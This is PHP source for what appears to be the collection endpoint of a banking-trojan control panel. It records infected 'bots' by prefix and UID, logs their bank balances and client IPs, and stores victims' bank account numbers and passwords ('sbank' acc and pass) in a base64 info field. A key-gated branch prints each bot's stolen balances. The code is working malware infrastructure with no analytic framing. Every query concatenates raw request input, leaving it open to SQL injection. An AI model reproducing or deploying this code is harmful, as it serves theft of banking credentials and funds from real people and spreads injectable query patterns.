<?php

$dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';

error_reporting(0);
ini_set('error_reporting', 0);
header("Pragma: no-cache");
header("Expires: 0");

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';

include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.get_config.php');

$cfg_db = get_config();

require_once($dir . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true);

if(!empty($_GET['uid'])) $uid = $_GET['uid'];
if(!empty($_POST['uid'])) $uid = $_POST['uid'];
if(!empty($_GET['sum'])) $sum = $_GET['sum'];
if(!empty($_POST['sum'])) $sum = $_POST['sum'];
if(!empty($_GET['acc'])) $acc = $_GET['acc'];
if(!empty($_POST['acc'])) $acc = $_POST['acc'];
if(!empty($_GET['type'])) $type = $_GET['type'];
if(!empty($_POST['type'])) $type = $_POST['type'];
if(!empty($_GET['sys']) && empty($type)) $type = $_GET['sys'];
if(!empty($_POST['sys']) && empty($type)) $type = $_POST['sys'];
if(!empty($_GET['pass'])) $pass = $_GET['pass'];
if(!empty($_POST['pass'])) $pass = $_POST['pass'];
if(!empty($_GET['cid'])) $userid = $_GET['cid'];
if(!empty($_POST['cid'])) $userid = $_POST['cid'];

if(empty($uid)){
	print_data('BOT_ERROR!', true);
}else{
	$matches = explode('0', $uid, 2);
	if(!empty($matches[0]) && !empty($matches[1])){
		$prefix = $matches[0];
		$uid = '0' . $matches[1];
	}else{
		print_data('BOT_ERROR!', true);
	}
}

$prefix = strtoupper($prefix);
$uid = strtoupper($uid);

if($type == 'get'){
	if($pass == $config['akey']){
		$system = $mysqli->query('SELECT nid, name FROM bf_systems');
		$sys = array();
		foreach($system as $s){
			$sys[$s->nid] = $s->name;
		}
		
		$bot = $mysqli->query('SELECT a.prefix, a.uid, a.system, (SELECT balance FROM bf_balance b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.system = a.system) ORDER by post_date DESC LIMIT 1) balance FROM bf_bots a WHERE (`prefix` = \''.$prefix.'\') AND (`uid` = \''.$uid.'\')', null, null, false);
		
		//print('BOT: ' . $prefix . $uid . '<br><br>');
		if(count($bot) > 0){
			foreach($bot as $b){
				print($sys[$b->system] . ': ' . $b->balance . '<br>');
			}
		}
		
		exit;
	}else{
		exit;
	}
}

if(empty($sum)) print_data('SUM_ERROR!', true);
if(!preg_match('~^[0-9.]+$~', $sum)) print_data('SUM_ERROR!', true);
if(empty($type)) print_data('TYPE_ERROR!', true);

$system = $mysqli->query('SELECT id, nid FROM bf_systems WHERE (`nid` = \''.$type.'\') LIMIT 1');
if($system->nid != $type) print_data('TYPE_NOTFOUND!', true);

if(empty($userid)){
	if(file_exists($dir . 'cache/clients.json')){
		$clients = @json_decode(@file_get_contents($dir . 'cache/clients.json'), true);
		if(is_array($clients) && $clients[$prefix]){
			$userid = $clients[$prefix];
		}
	}
}

$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (`prefix` = \''.$prefix.'\') AND (`uid` = \''.$uid.'\') AND (`system` = \''.$system->nid.'\') LIMIT 1');

if(empty($acc)){
	if($bot->prefix == $prefix && $bot->uid == $uid){
		$mysqli->query("INSERT INTO bf_balance set userid = '".$userid."', prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', system='".$system->nid."', balance='".$sum."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
	}else{
		$mysqli->query("INSERT INTO bf_bots set userid = '".$userid."', prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', system='".$system->nid."', last_date = CURRENT_TIMESTAMP() on duplicate key update last_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
		$mysqli->query("INSERT INTO bf_balance set userid = '".$userid."', prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', system='".$system->nid."', balance='".$sum."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
	}
}else{
	if($bot->prefix == $prefix && $bot->uid == $uid){
		$mysqli->query("INSERT INTO bf_balance set userid = '".$userid."', prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', system='".$system->nid."', balance='".$sum."', acc='".$acc."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
	}else{
		$mysqli->query("INSERT INTO bf_bots set userid = '".$userid."', prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', system='".$system->nid."', last_date = CURRENT_TIMESTAMP() on duplicate key update last_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
		$mysqli->query("INSERT INTO bf_balance set userid = '".$userid."', prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', system='".$system->nid."', balance='".$sum."', acc='".$acc."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
	}
}

if(!empty($pass)){
	$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (`prefix` = \''.$prefix.'\') AND (`uid` = \''.$uid.'\') AND (`system` = \''.$system->nid.'\') LIMIT 1');
	
	if($bot->prefix == $prefix && $bot->uid == $uid){
		
		$bot->info = json_decode(base64_decode($bot->info), 1);
		
		$bot->info['sbank'] = array();
		$bot->info['sbank']['acc'] = $acc;
		$bot->info['sbank']['pass'] = $pass;
		
		
		$mysqli->query('update bf_bots set info = \''.base64_encode(json_encode($bot->info)).'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
	}
}

?>